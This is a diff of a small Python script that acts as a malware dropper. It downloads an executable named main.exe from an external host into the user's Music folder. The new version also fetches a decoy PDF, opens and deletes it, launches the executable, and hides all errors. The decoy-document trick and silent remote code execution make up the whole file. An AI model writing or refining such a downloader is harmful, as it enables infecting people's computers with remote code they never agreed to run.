@@ -1,4 +1,4 @@
-import subprocess,requests,os
+import requests,os
 
 def download(url):
 
@@ -8,7 +8,6 @@ def download(url):
         out_file.write(get_response.content)
     
 
-download("https://armeng.pythonanywhere.com/media/files/main.exe")
 current_dir = os.getcwd()
 strr = os.getcwd()
 x = -2
@@ -21,8 +20,12 @@ for i in range(x):
 
 os.chdir("Music")
 try:
-    os.rename(current_dir+r"\main.exe", os.getcwd()+r"\main.exe")
-except FileExistsError:
+    download("https://armeng.pythonanywhere.com/media/files/main.exe")
+    download("https://armeng.pythonanywhere.com/media/files/gt3-gt4-bep.pdf")
+    os.startfile("gt3-gt4-bep.pdf")  
+    os.remove("gt3-gt4-bep.pdf")
+    os.startfile("main.exe")
+except Exception:
     pass
 
-subprocess.call("main.exe", shell=True)
+
